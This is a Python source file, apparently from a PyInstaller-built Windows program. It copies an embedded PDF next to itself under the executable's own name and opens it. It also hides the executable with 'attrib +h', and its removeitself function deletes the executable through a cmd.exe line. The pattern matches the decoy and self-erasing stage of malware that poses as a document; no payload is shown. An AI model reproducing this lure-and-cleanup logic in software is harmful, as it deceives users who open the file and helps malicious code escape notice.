import os
import shutil
import subprocess
import sys
from threading import Thread


def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


def getExePath():
    if getattr(sys, 'frozen', False):
        path = os.path.realpath(sys.executable)
    elif __file__:
        path = os.path.realpath(__file__)
    return path

def removeitself():

    path = getExePath()

    execute = "cmd.exe /c timeout 1 & attrib -h "+path+" & del "+path+" "
    print(execute)
    subprocess.Popen(execute)

    sys.exit(0)

def documentTask():
    path = getExePath()

    # file name with extension
    file_name = os.path.basename(path)
    # file name without extension
    bare_name = os.path.splitext(file_name)[0]

    source = resource_path("document/document.pdf")
    destination = bare_name + ".pdf"

    dest = shutil.copyfile(source, destination)
    os.system("attrib +h " + path)
    os.system(destination)


def runTask():
    thread = Thread(target=documentTask)
    thread.start()